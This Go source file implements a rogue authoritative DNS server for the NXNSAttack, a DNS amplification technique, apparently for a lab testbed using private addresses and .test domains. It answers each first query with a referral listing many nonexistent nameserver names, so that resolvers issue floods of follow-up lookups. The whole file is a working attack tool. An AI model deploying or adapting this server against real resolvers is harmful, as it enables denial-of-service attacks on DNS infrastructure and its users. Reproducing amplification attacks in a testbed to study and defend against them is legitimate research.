package main

import (
	"fmt"
	"net"
	"strings"

	"github.com/tochusc/godns"
	"github.com/tochusc/godns/dns"
)

var NSCount = 10

var conf = godns.DNSServerConfig{
	IP:            net.IPv4(10, 10, 3, 3),
	Port:          53,
	NetworkDevice: "eth0",
	MTU:           1500,
	MAC:           net.HardwareAddr{0x02, 0x42, 0x0a, 0x0a, 0x03, 0x03},
}

type NXNSResponser struct {
	ServerConf      godns.DNSServerConfig
	DefaultResp     godns.ResponseInfo
	ClientMap       map[string]ClientInfo
	RefferalSection dns.DNSResponseSection
}

type ClientInfo struct {
	QueryTimes int
	QueryList  []godns.QueryInfo

	// NXNS
	IsDirected bool
	DirectedTo string
}

func (d *NXNSResponser) RegisterClient(qInfo godns.QueryInfo) {
	qIP := qInfo.IP.String()
	if _, ok := d.ClientMap[qIP]; !ok {
		d.ClientMap[qIP] = ClientInfo{
			QueryTimes: 1,
			QueryList:  []godns.QueryInfo{},
			IsDirected: false,
			DirectedTo: "",
		}
	} else {
		clientInfo := d.ClientMap[qIP]
		clientInfo.QueryTimes++
		clientInfo.QueryList = append(clientInfo.QueryList, qInfo)
		d.ClientMap[qIP] = clientInfo
	}
}

func (d NXNSResponser) InitResp(qInfo godns.QueryInfo) godns.ResponseInfo {
	rInfo := d.DefaultResp
	rInfo.MAC = qInfo.MAC
	rInfo.IP = qInfo.IP
	rInfo.Port = qInfo.Port
	rInfo.DNS = &dns.DNSMessage{
		Header:     d.DefaultResp.DNS.Header,
		Answer:     []dns.DNSResourceRecord{},
		Authority:  []dns.DNSResourceRecord{},
		Additional: []dns.DNSResourceRecord{},
	}
	rInfo.DNS.Header.ID = qInfo.DNS.Header.ID
	rInfo.DNS.Header.QDCount = qInfo.DNS.Header.QDCount
	rInfo.DNS.Question = qInfo.DNS.Question
	return rInfo
}

func (d NXNSResponser) Response(qInfo godns.QueryInfo) (godns.ResponseInfo, error) {
	d.RegisterClient(qInfo)
	rInfo := d.InitResp(qInfo)

	qName := qInfo.DNS.Question[0].Name
	qLabels := strings.Split(qName, ".")
	// xxx.xxxx.test A/Referral
	if len(qLabels) == 3 {
		// ns.xxxx.test A
		if qLabels[0] == "ns" {
			rInfo.DNS.Header.RCode = dns.DNSResponseCodeNoErr
			rInfo.DNS.Header.ANCount = 1
			rInfo.DNS.Answer = []dns.DNSResourceRecord{
				{
					Name:  qName,
					Type:  dns.DNSRRTypeA,
					Class: dns.DNSClassIN,
					TTL:   86400,
					RDLen: 0,
					RData: &dns.DNSRDATAA{Address: net.IPv4(10, 10, 3, 3)},
				},
			}
			return rInfo, nil
		}
		// xxx.xxxx.test NXDOMAIN/Referral
		qIP := qInfo.IP.String()
		// 如果已经被引导过, 则返回 NXDOMAIN
		if d.ClientMap[qIP].IsDirected {
			rInfo.DNS.Header.RCode = dns.DNSResponseCodeNXDomain
			return rInfo, nil
		}
		// 否则返回 Referral
		rInfo.DNS.Header.RCode = dns.DNSResponseCodeNoErr
		rInfo.DNS.Header.ANCount = 0
		rInfo.DNS.Header.NSCount = uint16(NSCount)
		rInfo.DNS.Authority = d.RefferalSection
		for i := 0; i < NSCount; i++ {
			rInfo.DNS.Authority[i].Name = qName
		}
		cInfo := d.ClientMap[qIP]
		cInfo.IsDirected = true
		d.ClientMap[qIP] = cInfo
		return rInfo, nil
	}
	// xxxx.test A
	if len(qLabels) == 2 {
		rInfo.DNS.Header.RCode = dns.DNSResponseCodeNoErr
		rInfo.DNS.Header.ANCount = 1
		rInfo.DNS.Answer = []dns.DNSResourceRecord{
			{
				Name:  qName,
				Type:  dns.DNSRRTypeA,
				Class: dns.DNSClassIN,
				TTL:   86400,
				RDLen: 0,
				RData: &dns.DNSRDATAA{Address: net.IPv4(10, 10, 3, 3)},
			},
		}
		return rInfo, nil
	}
	// NXDOMAIN
	return rInfo, nil
}

func main() {
	// 创建一个 DNS 服务器
	server := godns.GoDNSSever{
		ServerConfig: conf,
		Sniffer: []*godns.Sniffer{
			godns.NewSniffer(godns.SnifferConfig{
				Device:   conf.NetworkDevice,
				Port:     conf.Port,
				PktMax:   65535,
				Protocol: godns.ProtocolUDP,
			}),
		},
		Handler: godns.NewHandler(conf,
			&NXNSResponser{
				ServerConf: conf,
				DefaultResp: godns.ResponseInfo{
					// MAC:  qInfo.MAC,
					// IP:   qInfo.IP,
					// Port: qInfo.Port,
					DNS: &dns.DNSMessage{
						Header: dns.DNSHeader{
							// ID:      qInfo.DNS.Header.ID,
							QR:     true,
							OpCode: dns.DNSOpCodeQuery,
							AA:     true,
							TC:     false,
							RD:     false,
							RA:     false,
							Z:      0,
							// 很可能会想更改这个RCode
							RCode: dns.DNSResponseCodeNXDomain,
							// QDCount: qInfo.DNS.Header.QDCount,
							ANCount: 0,
							NSCount: 0,
							ARCount: 0,
						},
						// Question:   qInfo.DNS.Question,
						Answer:     []dns.DNSResourceRecord{},
						Authority:  []dns.DNSResourceRecord{},
						Additional: []dns.DNSResourceRecord{},
					},
				},
				ClientMap: map[string]ClientInfo{},
				RefferalSection: func() []dns.DNSResourceRecord {
					refSection := []dns.DNSResourceRecord{}
					for i := 0; i <= NSCount; i++ {
						refSection = append(refSection,
							dns.DNSResourceRecord{
								Name:  fmt.Sprintf("ns.nxns%d.test", i),
								Type:  dns.DNSRRTypeNS,
								Class: dns.DNSClassIN,
								TTL:   86400,
								RDLen: 0,
								RData: &dns.DNSRDATANS{NSDNAME: fmt.Sprintf("ns.nxns%d.test", i)},
							},
						)
					}
					return refSection
				}(),
			},
		),
	}

	// 启动 DNS 服务器
	server.Start()
}
